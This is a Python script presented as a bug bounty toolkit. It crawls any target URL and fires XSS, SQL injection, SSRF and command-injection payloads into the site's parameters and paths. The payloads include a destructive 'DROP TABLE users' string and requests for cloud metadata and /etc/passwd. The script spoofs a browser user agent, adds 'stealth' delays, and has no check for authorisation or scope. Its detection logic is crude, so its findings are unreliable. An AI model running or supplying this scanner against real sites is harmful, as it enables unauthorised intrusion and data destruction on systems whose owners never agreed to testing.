#!/usr/bin/env python3
"""
SOLOBounty - Advanced Bug Bounty Toolkit for Individual Use
"""

import sys
import re
import time
import json
import random
import html
import logging
import requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup

# ===============================
# CONFIGURATION
# ===============================
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml',
}

BLOCKLIST = ["logout", "signup", "malicious.com"]

VULN_PAYLOADS = {
    'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
    'sqli': ["' OR 1=1--", "' UNION SELECT null,version()--", "1; DROP TABLE users--"],
    'ssrf': ["http://169.254.169.254/latest/meta-data/", "http://internal.local", "file:///etc/passwd"],
    'command_injection': ["; whoami", "| ls /", "`id`"],
}

# ===============================
# UTILITY FUNCTIONS
# ===============================
def stealth_delay():
    time.sleep(max(1, min(3, abs(random.gauss(2, 0.5)))))

def should_visit(url):
    return not any(block in url for block in BLOCKLIST)

def get_links(url, html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    links = set()
    for tag in soup.find_all('a', href=True):
        full_url = urljoin(url, tag['href'])
        if urlparse(full_url).netloc == urlparse(url).netloc and should_visit(full_url):
            links.add(full_url)
    return links

def test_vulnerabilities(url):
    findings = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Test parameter-based vulnerabilities
    for param in params:
        for vuln_type, payloads in VULN_PAYLOADS.items():
            for payload in payloads:
                test_params = {**params, param: payload}
                test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                try:
                    start = time.time()
                    r = requests.get(test_url, headers=HEADERS, timeout=10)
                    elapsed = time.time() - start

                    if vuln_type == 'xss' and payload in r.text:
                        findings.append(("xss", test_url, "payload"))
                    elif vuln_type == 'sqli' and ('sql syntax' in r.text.lower() or elapsed > 4):
                        findings.append(("sqli", test_url, "payload"))
                except:
                    pass
                stealth_delay()

    # Test endpoint-based vulnerabilities
    for endpoint in VULN_PAYLOADS['ssrf'] + VULN_PAYLOADS['command_injection']:
        test_url = urljoin(url, endpoint)
        try:
            r = requests.get(test_url, headers=HEADERS, timeout=5)
            if r.status_code == 200:
                findings.append(("open_endpoint", test_url, "endpoint"))
        except:
            pass
        stealth_delay()

    return findings

# ===============================
# MAIN CRAWLER
# ===============================
def crawl(target, max_depth=2):
    visited = set()
    queue = [(target, 0)]

    while queue:
        url, depth = queue.pop(0)
        if depth > max_depth or url in visited or not should_visit(url):
            continue

        try:
            print(f"[*] Scanning: {url}")
            r = requests.get(url, headers=HEADERS, timeout=10)
            visited.add(url)

            findings = test_vulnerabilities(url)
            for ftype, location, method in findings:
                print(f"[!] {ftype.upper()} found at {location} (detected_by: {method})")

            if 'text/html' in r.headers.get('Content-Type', ''):
                links = get_links(url, r.text)
                queue.extend((link, depth + 1) for link in links if link not in visited)

            stealth_delay()

        except Exception as e:
            print(f"[!] Error scanning {url}: {e}")

# ===============================
# ENTRY POINT
# ===============================
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    print(f"[*] Starting SOLOBounty against: {target}")
    crawl(target)
    print("[*] Scan complete. Manual validation advised.")
